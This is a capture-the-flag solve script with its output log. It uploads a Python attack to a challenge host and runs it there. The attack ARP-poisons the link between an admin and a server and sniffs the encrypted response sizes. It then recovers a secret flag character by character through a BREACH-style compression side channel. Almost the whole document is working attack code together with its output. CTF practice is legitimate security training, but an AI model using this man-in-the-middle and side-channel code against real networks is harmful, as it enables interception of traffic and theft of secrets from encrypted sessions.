from pwn import remote, context
import sys
import time

context.log_level = "info"

HOST = "challs.umdctf.io"
PORT = 31338

REMOTE_SCRIPT = r'''
import os
import re
import ssl
import time
import fcntl
import socket
import struct
import threading
import urllib.parse
import http.client
from collections import Counter, deque

ADMIN_IP = "10.0.0.1"
SERVER_IP = "10.0.0.2"
SERVER_PORT = 443

# Your log already strongly suggests first unknown char is 's'
START_PREFIX = "UMDCTF{s"
CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789_}"
MAX_FILTER_LEN = 128

packets = deque(maxlen=50000)
pkt_lock = threading.Lock()
stop_flag = False


def run(cmd):
    return os.popen(cmd + " 2>/dev/null").read()


def clean_iface(name):
    return name.split("@", 1)[0].strip()


def get_iface():
    out = run("ip -o -4 addr show")
    for line in out.splitlines():
        if "10.0.0.3/" in line:
            return clean_iface(line.split()[1])

    out = run("ip route get 10.0.0.2")
    m = re.search(r"\bdev\s+(\S+)", out)
    if m:
        return clean_iface(m.group(1))

    out = run("ip -o link show")
    for line in out.splitlines():
        m = re.match(r"\d+:\s+([^:]+):", line)
        if m:
            name = clean_iface(m.group(1))
            if name != "lo":
                return name

    return "eth0"


def get_ipv4_addr(iface):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ifreq = struct.pack("256s", iface[:15].encode())
    try:
        res = fcntl.ioctl(s.fileno(), 0x8915, ifreq)  # SIOCGIFADDR
        return socket.inet_ntoa(res[20:24])
    finally:
        s.close()


def get_mac(iface):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ifreq = struct.pack("256s", iface[:15].encode())
    try:
        res = fcntl.ioctl(s.fileno(), 0x8927, ifreq)  # SIOCGIFHWADDR
        return res[18:24]
    finally:
        s.close()


def macstr(mac):
    return ":".join(f"{b:02x}" for b in mac)


def ip2b(ip):
    return socket.inet_aton(ip)


def enable_forwarding():
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1\n")
        print("[+] enabled ip_forward")
    except Exception:
        print("[!] could not enable ip_forward; continuing anyway")


def learn_mac(iface, my_ip, target_ip, timeout=6.0):
    my_mac = get_mac(iface)

    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
    s.bind((iface, 0))
    s.settimeout(0.25)

    broadcast = b"\xff" * 6
    zero = b"\x00" * 6

    eth = broadcast + my_mac + struct.pack("!H", 0x0806)
    arp = struct.pack(
        "!HHBBH6s4s6s4s",
        1, 0x0800, 6, 4, 1,
        my_mac, ip2b(my_ip),
        zero, ip2b(target_ip),
    )
    pkt = eth + arp

    end = time.time() + timeout
    while time.time() < end:
        try:
            s.send(pkt)
        except Exception:
            pass

        try:
            data = s.recv(2048)
        except socket.timeout:
            continue

        if len(data) < 42 or data[12:14] != b"\x08\x06":
            continue

        op = struct.unpack("!H", data[20:22])[0]
        sender_mac = data[22:28]
        sender_ip = socket.inet_ntoa(data[28:32])

        if op == 2 and sender_ip == target_ip:
            s.close()
            return sender_mac

    s.close()
    raise RuntimeError(f"could not learn MAC for {target_ip}")


def make_arp_reply(src_mac, src_ip, dst_mac, dst_ip):
    eth = dst_mac + src_mac + struct.pack("!H", 0x0806)
    arp = struct.pack(
        "!HHBBH6s4s6s4s",
        1, 0x0800, 6, 4, 2,
        src_mac, ip2b(src_ip),
        dst_mac, ip2b(dst_ip),
    )
    return eth + arp


def poison_loop(iface, my_mac, admin_mac, server_mac):
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    s.bind((iface, 0))

    pkt1 = make_arp_reply(my_mac, SERVER_IP, admin_mac, ADMIN_IP)
    pkt2 = make_arp_reply(my_mac, ADMIN_IP, server_mac, SERVER_IP)

    print("[+] ARP poison loop started")
    while not stop_flag:
        try:
            s.send(pkt1)
            s.send(pkt2)
        except Exception as e:
            print("[!] poison error:", repr(e))
        time.sleep(0.30)


def parse_ipv4_tcp_payload_len(frame):
    if len(frame) < 54:
        return None

    eth_type = struct.unpack("!H", frame[12:14])[0]
    if eth_type != 0x0800:
        return None

    ip_start = 14
    ver_ihl = frame[ip_start]
    if (ver_ihl >> 4) != 4:
        return None

    ihl = (ver_ihl & 0x0f) * 4
    proto = frame[ip_start + 9]
    if proto != 6:
        return None

    total_len = struct.unpack("!H", frame[ip_start + 2:ip_start + 4])[0]
    src_ip = socket.inet_ntoa(frame[ip_start + 12:ip_start + 16])
    dst_ip = socket.inet_ntoa(frame[ip_start + 16:ip_start + 20])

    tcp_start = ip_start + ihl
    if len(frame) < tcp_start + 20:
        return None

    src_port, dst_port = struct.unpack("!HH", frame[tcp_start:tcp_start + 4])
    doff = (frame[tcp_start + 12] >> 4) * 4
    payload_len = total_len - ihl - doff
    if payload_len <= 0:
        return None

    return src_ip, dst_ip, src_port, dst_port, payload_len


def sniff_loop(iface):
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
    s.bind((iface, 0))
    print("[+] sniffer started on", iface)

    while not stop_flag:
        try:
            frame = s.recv(65535)
        except Exception:
            continue

        p = parse_ipv4_tcp_payload_len(frame)
        if not p:
            continue

        src_ip, dst_ip, src_port, dst_port, plen = p
        if src_ip == SERVER_IP and dst_ip == ADMIN_IP and src_port == SERVER_PORT:
            with pkt_lock:
                packets.append((time.monotonic(), plen))


def post_filter(value):
    body = urllib.parse.urlencode({"filter": value})
    ctx = ssl._create_unverified_context()
    conn = http.client.HTTPSConnection(SERVER_IP, SERVER_PORT, context=ctx, timeout=4)
    conn.request(
        "POST",
        "/api/suggestions",
        body=body,
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": str(len(body)),
            "Connection": "close",
        },
    )
    resp = conn.getresponse()
    data = resp.read()
    conn.close()
    if resp.status != 200:
        raise RuntimeError(f"POST failed: {resp.status} {data!r}")


def make_probe(candidate):
    if len(candidate) > MAX_FILTER_LEN:
        candidate = candidate[-MAX_FILTER_LEN:]
    return "A" * (MAX_FILTER_LEN - len(candidate)) + candidate


def clear_packets():
    with pkt_lock:
        packets.clear()


def packets_since(t0):
    with pkt_lock:
        return [n for ts, n in packets if ts >= t0]


def extract_small_score(lens):
    """
    We observed pairs like:
      214,214,106,106
      214,214,107,107
    The leak is in the smaller packet.
    """
    small = [x for x in lens if 80 <= x <= 140]
    if not small:
        return 999999, []
    c = Counter(small)
    val, cnt = c.most_common(1)[0]
    return val, c.most_common(4)


def measure_once(candidate, warmup=0.08, window=0.22):
    clear_packets()
    post_filter(make_probe(candidate))
    time.sleep(warmup)
    t0 = time.monotonic()
    time.sleep(window)
    lens = packets_since(t0)
    return extract_small_score(lens)


def measure_repeat(candidate, rounds=2):
    vals = []
    commons = []
    for _ in range(rounds):
        v, common = measure_once(candidate)
        if v != 999999:
            vals.append(v)
            commons.extend([x for x, _ in common])
    if not vals:
        return 999999, []
    vals.sort()
    return vals[len(vals)//2], Counter(commons).most_common(4)


def recover_flag():
    flag = START_PREFIX
    print("[+] starting recovery with", flag)

    while True:
        chars = CHARSET
        results = []

        print(f"\\n[*] recovering position {len(flag)} ; current={flag}")

        # first pass: 1 quick measurement each
        for ch in chars:
            cand = flag + ch
            score, common = measure_once(cand)
            results.append((score, ch, common))
            print(f"    {cand!r:45s} score={score} common={common}", flush=True)

        results.sort(key=lambda x: x[0])

        print("\\n[*] top first-pass candidates:")
        for score, ch, common in results[:6]:
            print(f"    {flag + ch!r:45s} score={score} common={common}", flush=True)

        # verify only best 3
        verified = []
        print("\\n[*] verifying best 3...")
        for _, ch, _ in results[:3]:
            cand = flag + ch
            score, common = measure_repeat(cand, rounds=3)
            verified.append((score, ch, common))
            print(f"    VERIFY {cand!r:38s} score={score} common={common}", flush=True)

        verified.sort(key=lambda x: x[0])
        best_score, best_ch, best_common = verified[0]

        flag += best_ch
        print(f"\\n[+] chose {best_ch!r} with score={best_score} common={best_common}")
        print(f"[+] flag so far: {flag}", flush=True)

        if best_ch == "}":
            print("\\n[+] FLAG:", flag)
            return flag


def main():
    global stop_flag

    iface = get_iface()
    my_ip = get_ipv4_addr(iface)
    my_mac = get_mac(iface)

    print("[+] iface:", iface)
    print("[+] my ip:", my_ip)
    print("[+] my mac:", macstr(my_mac))

    enable_forwarding()

    print("[*] learning admin MAC...")
    admin_mac = learn_mac(iface, my_ip, ADMIN_IP)
    print("[+] admin mac:", macstr(admin_mac))

    print("[*] learning server MAC...")
    server_mac = learn_mac(iface, my_ip, SERVER_IP)
    print("[+] server mac:", macstr(server_mac))

    threading.Thread(target=sniff_loop, args=(iface,), daemon=True).start()
    threading.Thread(target=poison_loop, args=(iface, my_mac, admin_mac, server_mac), daemon=True).start()

    print("[*] waiting for traffic...")
    deadline = time.time() + 6
    while time.time() < deadline:
        time.sleep(0.4)
        with pkt_lock:
            sample = list(packets)[-8:]
        if sample:
            print("[+] traffic sample:", sample)
            break

    print("[*] sanity probe...")
    post_filter(make_probe(flag if False else START_PREFIX))
    time.sleep(0.8)

    with pkt_lock:
        sample = list(packets)[-20:]
    print("[+] packet sample:", sample)

    if not sample:
        print("[-] no admin traffic captured")
        return

    recover_flag()


if __name__ == "__main__":
    try:
        main()
    finally:
        stop_flag = True
'''

def upload_and_run():
    io = remote(HOST, PORT)
    time.sleep(1)

    banner = io.recv(timeout=3)
    if banner:
        sys.stdout.buffer.write(banner)
        sys.stdout.flush()

    io.sendline(b"echo READY")
    io.recvuntil(b"READY", timeout=5)

    io.sendline(b"cat > /tmp/breach_fast.py <<'PY_REMOTE_SOLVER'")
    for line in REMOTE_SCRIPT.splitlines():
        io.sendline(line.encode())
    io.sendline(b"PY_REMOTE_SOLVER")

    io.sendline(b"python3 /tmp/breach_fast.py")
    io.interactive()

if __name__ == "__main__":
    upload_and_run()


# Output:
# .........
#     'UMDCTF{s1z3s_b3tr4y_y0u_3v3n_w1th_ca}'       score=105 common=[(105, 6)]
# \n[*] top first-pass candidates:
#     'UMDCTF{s1z3s_b3tr4y_y0u_3v3n_w1th_ca}'       score=105 common=[(105, 6)]
#     'UMDCTF{s1z3s_b3tr4y_y0u_3v3n_w1th_caa'       score=107 common=[(107, 8)]
#     'UMDCTF{s1z3s_b3tr4y_y0u_3v3n_w1th_cab'       score=107 common=[(107, 8)]
#     'UMDCTF{s1z3s_b3tr4y_y0u_3v3n_w1th_cac'       score=107 common=[(107, 8)]
#     'UMDCTF{s1z3s_b3tr4y_y0u_3v3n_w1th_cad'       score=107 common=[(107, 8)]
#     'UMDCTF{s1z3s_b3tr4y_y0u_3v3n_w1th_cae'       score=107 common=[(107, 10)]
# \n[*] verifying best 3...
#     VERIFY 'UMDCTF{s1z3s_b3tr4y_y0u_3v3n_w1th_ca}' score=105 common=[(105, 3)]
#     VERIFY 'UMDCTF{s1z3s_b3tr4y_y0u_3v3n_w1th_caa' score=107 common=[(107, 3)]
#     VERIFY 'UMDCTF{s1z3s_b3tr4y_y0u_3v3n_w1th_cab' score=107 common=[(107, 3)]
# \n[+] chose '}' with score=105 common=[(105, 3)]
# [+] flag so far: UMDCTF{s1z3s_b3tr4y_y0u_3v3n_w1th_ca}
# \n[+] FLAG: UMDCTF{s1z3s_b3tr4y_y0u_3v3n_w1th_ca}